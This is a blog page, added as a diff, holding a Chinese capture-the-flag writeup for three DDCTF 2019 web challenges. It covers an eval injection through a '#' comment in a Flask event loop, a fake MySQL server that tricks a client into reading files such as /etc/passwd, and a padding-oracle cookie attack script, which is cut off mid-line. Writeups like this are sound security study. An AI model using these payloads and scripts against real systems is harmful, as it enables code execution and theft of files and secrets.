@@ -1,0 +1,1041 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="hurricane618">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="hurricane618">
+    
+    <meta name="keywords" content="hexo,web security,ctf,hurricane618,代码审计,iot">
+    
+    <meta name="description" content="hurricane618's blog">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>2019DDCTF 未解决的web题 writeup · 风之栖息地|hurricane618&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/hurricane_favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-121933059-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">风之栖息地</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2019DDCTF 未解决的web题 writeup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">风之栖息地</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg1.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2019DDCTF 未解决的web题 writeup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.6k</span>阅读时长: <span class="post-count reading-time">10 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/04/29</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>一道python的代码审计题目，题目的入口点会检测url中携带的参数并且初始化session的值。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">	  querystring = urllib.unquote(request.query_string)</span><br><span class="line">	  request.event_queue = []</span><br><span class="line">	  <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">		    querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">	  <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">		    session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">		    session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">		    session[<span class="string">'log'</span>] = []</span><br><span class="line">	  request.prev_session = dict(session)</span><br><span class="line">	  trigger_event(querystring)</span><br><span class="line">	  <span class="keyword">return</span> execute_event_loop()</span><br></pre></td></tr></table></figure>
+<p>这里看到对查询参数有转义，同时有一定的限制，比如开头必须为<code>action:</code>，同时长度不能超过100。</p>
+<p>在进入处理事件循环之前会先将查询参数添加进事件记录中。这里可以看到会对<code>event</code>做判断，所以它既可以传数列也可以是单个值，这里是这道题目的关键点之一，它的参数是可以传数列的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">	  session[<span class="string">'log'</span>].append(event)</span><br><span class="line">	  <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">	  <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">		    request.event_queue += event</span><br><span class="line">	  <span class="keyword">else</span>:</span><br><span class="line">		    request.event_queue.append(event)</span><br></pre></td></tr></table></figure>
+<p>这之后就会进入事件处理循环中，最关键的一点是针对事件的处理，从事件队列中取出一个，随后会判断是否为<code>action</code>，将<code>:</code>和<code>;</code>之间的字符串当作函数动作名，并且把剩下的字符串用<code>#</code>切分当作参数。函数动作拼接后缀字符串之后用<code>eval</code>执行成为相应的函数，最后函数带入参数执行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">		request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">    ...</span><br><span class="line">		is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">		action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">		args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">				event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">				ret_val = event_handler(args)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>大致的流程就是这样，这里题目的关键点是下面的<code>getflag</code>函数，可以看到当session中的数量大于5的时候会将flag添加进事件记录中，同时事件队列也会添加这个任务。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">	  flag = args[<span class="number">0</span>]</span><br><span class="line">	  <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">	  <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	  <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">		    trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">	  trigger_event(<span class="string">'action:view;index'</span>)</span><br></pre></td></tr></table></figure>
+<p>但是起始的点数为3，我们怎么才能获得5个钻石？这就要分析购买钻石的操作流程了，这里的购买操作会先增加钻石数量，然后将消费操作加入事件队列中，这就是说购买和消费是分开的并不是原子操作。那么我们可以购买多个钻石，在消费操作之前执行<code>getflag</code>函数就能把flag存入事件队列中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">	  num_items = int(args[<span class="number">0</span>])</span><br><span class="line">	  <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">	  session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">	  trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">	  point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">	  <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">	  session[<span class="string">'points'</span>] -= point_to_consume</span><br></pre></td></tr></table></figure>
+<p>好了，我当时就卡在这里，不知道该怎么走下去。因为这里如果按照常规操作只能一次执行一个函数，并不能一次性多次购买，这是第一个问题；第二，就算多次购买之后执行<code>getflag</code>我们也仅仅是把flag放进了事件队列中，而每个事件是独立的没有办法获取前面事件的参数。</p>
+<p>针对第一个问题，如何一次性多次购买，这里就要观察代码中它是如何多次执行的，<code>trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])</code>，使用了<code>trigger_event</code>传入数列，其中数列就是多个操作的集合，所以这里我们也看看能不能调用<code>trigger_event</code>。这里用到了一个作者设计上的问题，如果<code>action</code>中包含<code>#</code>，恰好这个符号是python中的注释符号，那么这个语句中<code>eval(action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))</code>那个<code>#</code>就可以截断后面的后缀，这里的action就是任意代码执行。</p>
+<p>我们的payload：<code>action:trigger_event%23;action:xxx;arg1%23action:xxx;arg2%23</code>，这样后面的参数部分跟着想要调用的函数就可以被<code>trigger_event</code>加进事件队列中，这样我们就可以一次性多次购买了，同时调用<code>getflag</code>就能添加flag进事件队列中。payload：<code>action:trigger_event%23;action:buy;1%23action:buy;1%23action:get_flag;1</code>。</p>
+<p>针对第二个问题，flag已经进入到事件队列中了，怎么查看？这就涉及到flask的session设计了，之前ph牛讲过这类session是和jwt类似的原理。里面的东西是可以被解密的，不能存放用户凭证或者其他一些机密数据。<code>session[&#39;log&#39;].append(event)</code>，这里session会记录事件，所以flag最后也会被记录在里面，那么我们只要调用<code>get_flag</code>之后，我们的session中就会有相关记录，最后只需要解密就可以拿到flag。</p>
+<p>在本地操作可以看到拿到了测试用的flag。</p>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/1.png">
+<p>这里需要注意的一点是由于查询字符串会被限制在长度100以内，所以我们需要先正常购买三个钻石，然后再使用上面的方法一次性再购买两个，之后马上调用<code>get_flag</code>。这最后的解密是使用<a href="https://github.com/Paradoxis/Flask-Unsign" target="_blank" rel="noopener">https://github.com/Paradoxis/Flask-Unsign</a></p>
+<p>虽然最后会出现报错，如下图：</p>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/2.png">
+<p>但是，flag已经写进了session中，并且没有删除，这就是关键点。</p>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/3.png">
+<p>解密数据拿到flag。</p>
+<h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p>从网站页面看来是一个类似<code>hydra</code>的扫描网站，它会去连接我们提供的IP和端口。这里其实比较明显了，在之前比赛遇到的MySQL client读取的漏洞有关，同样是网站担当客户端去请求MySQL服务端。</p>
+<p>如果正常的去扫描的话结果如下：</p>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/4.png">
+<p>使用<code>tcpdump</code>抓包的结果是显示没有权限去访问。。。而且由于服务端开启了SSL加密，所以并不能开到所有有用的信息。</p>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/5.png">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &apos;root&apos;@&apos;117.51.147.155&apos; IDENTIFIED BY &apos;&apos;;</span><br><span class="line">grant all privileges on *.* to &apos;root&apos;@&apos;117.51.147.155&apos; IDENTIFIED BY &apos;&apos; with grant option;</span><br></pre></td></tr></table></figure>
+<p>所以创建一个授权的用户之后，再次抓包来观察数据情况。</p>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/6.png">
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/7.png">
+<p>它会以用户名为root，密码为空的请求来访问我们的MySQL服务端。那么从MySQL官方文档中我们就可以知道，<code>A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL</code>，不仅仅是在读文件操作可以获取本地文件，其他操作依旧可以，但是客户端必须要开启加载本地文件的选项。</p>
+<p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a>从这篇博文中我们获得一个恶意MySQL的脚本，为了让客户端发出查询的操作：</p>
+<ol>
+<li>服务端需要发送<code>Server Greeting</code></li>
+<li>等待客户端回复<code>Query Package</code></li>
+<li>发送<code>file transfer</code>请求</li>
+</ol>
+<p>当然这些格式在官方文档中都有，也可以通过抓包确认。</p>
+<p><a href="https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake" target="_blank" rel="noopener">MySQL握手包</a>，<a href="https://dev.mysql.com/doc/internals/en/com-query-response.html" target="_blank" rel="noopener">文件传输包</a></p>
+<p>然后py脚本开始！点击扫描！然后：</p>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/8.png">
+<p>emmmm？？？这是什么鬼？随后仔细看了看题目给的<code>agent.py</code>和抓包中的奇怪http请求，才发现原来这个代理是用来检测服务器上运行的进程的。</p>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/9.png">
+<p>那么这样就只能在返回的数据包中手动添加<code>mysqld</code>，来让客户端认为服务端是开启状态。</p>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/10.png">
+<p>测试成功，读取到了<code>/etc/passwd</code>的数据。那么接下来就是找flag的过程了。这里是直接读取<code>.bash_history</code>，shell的历史记录来回溯出题人的操作过程，发现最后的<code>/home/dc2-user/ctf_web_2/app/main/views.py</code>。</p>
+<p>在文件中有一条注释<code># flag in mysql  curl@localhost database:security  table:flag</code>，这就知道了flag在数据库中，这里直接读数据库文件就可以了，根据mysql的数据库存储规则<code>/var/lib/mysql/database/table.idb</code>，读取文件<code>/var/lib/mysql/security/flag.idb</code>。</p>
+<p>坑点：在启动伪装mysql的时候，可能一开始扫描会有些问题，有可能是端口释放需要一定的时间。所以如果一次不行，就要多扫几次。</p>
+<p>小技巧：怎么处理这么大一堆字符串，直接复制粘贴，在python中print一下就完事。简单粗暴，不用写脚本，不用手动排版。</p>
+<h2 id="再来一杯Java"><a href="#再来一杯Java" class="headerlink" title="再来一杯Java"></a>再来一杯Java</h2><p>根据题目的要求捆绑hosts，访问链接之后，在cookie中发现token。base64解码之后发现有hint，<code>PadOracle,cbc</code>。</p>
+<img src="/2019/04/29/2019ddctf-unsolved-writeup/11.png">
+<p>在这之后就是针对cookie做<code>padding oracle</code>和<code>cbc翻转</code>攻击。因为去除首部的描述字符的16位为IV，剩下的是推测的16位字符为一组的密文，那么这样的话就是16位字符串为一个区块。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(ciper_hex, N)</span>:</span></span><br><span class="line">    get = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="comment"># print(i,j)</span></span><br><span class="line">            padding = xor(get, chr(i) * (i - <span class="number">1</span>))</span><br><span class="line">            c = chr(<span class="number">0</span>) * (N - i) + chr(j) + padding</span><br><span class="line">            payload=<span class="string">'5061644f7261636c653a69762f636263'</span>+c.encode(<span class="string">'hex'</span>)+ciper_hex</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            get_api_return=get_api(payload)</span><br><span class="line">            <span class="comment"># print(get_api_return)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"decrypt err~"</span> <span class="keyword">not</span> <span class="keyword">in</span> get_api_return:</span><br><span class="line">                get = chr(j ^ i) + get</span><br><span class="line">                print(get.encode(<span class="string">'hex'</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> get.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(strings)</span>:</span></span><br><span class="line">    padding_len=<span class="number">8</span>-len(strings)%<span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> strings+chr(padding_len)*padding_len</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_api</span><span class="params">(ciphertext)</span>:</span></span><br><span class="line">    req_header=&#123;<span class="string">'X-Forwarded-For'</span>: <span class="string">''</span>,</span><br><span class="line"><span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063'</span>,</span><br><span class="line"><span class="string">'Host'</span>:<span class="string">'c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/home'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>:<span class="string">'token=&#123;&#125;'</span>.format(ciphertext.decode(<span class="string">'hex'</span>).encode(<span class="string">'base64'</span>)[:<span class="number">-1</span>]),</span><br><span class="line">&#125;</span><br><span class="line">    s = requests.session() </span><br><span class="line">    rsp=s.get(<span class="string">'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token'</span>, headers=req_header,timeout=<span class="number">2</span>,verify=<span class="keyword">False</span>,stream=<span 